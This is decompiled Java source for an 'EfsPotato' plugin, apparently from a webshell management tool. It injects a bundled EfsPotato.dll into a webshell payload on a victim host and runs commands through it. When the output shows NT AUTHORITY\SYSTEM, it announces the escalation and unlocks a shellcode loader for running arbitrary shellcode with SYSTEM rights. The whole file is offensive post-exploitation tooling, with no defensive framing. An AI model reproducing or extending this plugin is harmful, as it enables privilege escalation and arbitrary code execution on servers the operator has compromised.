/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.cshap;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import shells.plugins.generic.ShellcodeLoader;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(payloadName="CShapDynamicPayload", Name="EfsPotato", DisplayName="EfsPotato")
public class EfsPotato
extends ShellcodeLoader {
    private static final String CLASS_NAME = "EfsPotato.EfsPotato";
    private final JPanel panel = new JPanel(new BorderLayout());
    private final JPanel mainPanel = new JPanel(new BorderLayout());
    private final JButton loadButton = new JButton("Load");
    private final JButton runButton = new JButton("Run");
    private final JTextField commandTextField = new JTextField(35);
    private final JSplitPane splitPane;
    private final RTextArea resultTextArea = new RTextArea();
    private boolean loadState;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;
    private boolean superModel;

    public EfsPotato() {
        this.splitPane = new JSplitPane();
        this.splitPane.setOrientation(0);
        this.splitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.loadButton);
        topPanel.add(this.commandTextField);
        topPanel.add(this.runButton);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
        this.splitPane.addComponentListener(new ComponentAdapter(){

            @Override
            public void componentResized(ComponentEvent e) {
                EfsPotato.this.splitPane.setDividerLocation(0.15);
            }
        });
        this.panel.add(this.splitPane);
        this.commandTextField.setText("cmd /c whoami");
        this.mainPanel.add(this.panel);
    }

    @Override
    public boolean load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = this.getClass().getResourceAsStream("assets/EfsPotato.dll");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                    return this.loadState;
                }
                return false;
            } catch (Exception e) {
                Log.error(e);
            }
        }
        return this.loadState;
    }

    @Override
    public String getClassName() {
        return CLASS_NAME;
    }

    private void loadButtonClick(ActionEvent actionEvent) {
        if (this.load()) {
            GOptionPane.showMessageDialog(this.panel, "Load success", "\u63d0\u793a", 1);
        } else {
            GOptionPane.showMessageDialog(this.panel, "Load fail", "\u63d0\u793a", 2);
        }
    }

    private void runButtonClick(ActionEvent actionEvent) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("cmd", this.commandTextField.getText());
        byte[] result = this.payload.evalFunc(CLASS_NAME, "run", parameter);
        this.resultTextArea.setText(this.encoding.Decoding(result));
        if (!this.superModel && result != null && this.encoding.Decoding(result).toUpperCase().indexOf("NT AUTHORITY\\SYSTEM") != -1) {
            this.superModel = true;
            this.mainPanel.remove(this.panel);
            this.mainPanel.add(super.getView());
            this.tabbedPane.addTab("EfsPotato", this.panel);
            this.tabbedPane.setSelectedIndex(this.tabbedPane.getTabCount() - 1);
            ShellcodeLoader loader = (ShellcodeLoader)this.shellEntity.getFrame().getPlugin("ShellcodeLoader");
            if (loader != null) {
                loader.childLoder = this;
            }
            GOptionPane.showMessageDialog(this.panel, "\u60a8\u662fSYSTEM! \u5df2\u5347\u7ea7\u5230\u9ad8\u7ea7\u6a21\u5f0f", "\u63d0\u793a", 1);
        }
    }

    @Override
    public byte[] runShellcode(ReqParameter reqParameter, String command, byte[] shellcode, int readWait) {
        reqParameter.add("cmd", command);
        reqParameter.add("readWait", Integer.toString(readWait));
        return super.runShellcode(reqParameter, command, shellcode, readWait);
    }

    @Override
    public void init(ShellEntity shellEntity) {
        super.init(shellEntity);
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override
    public JPanel getView() {
        super.getView();
        return this.mainPanel;
    }
}

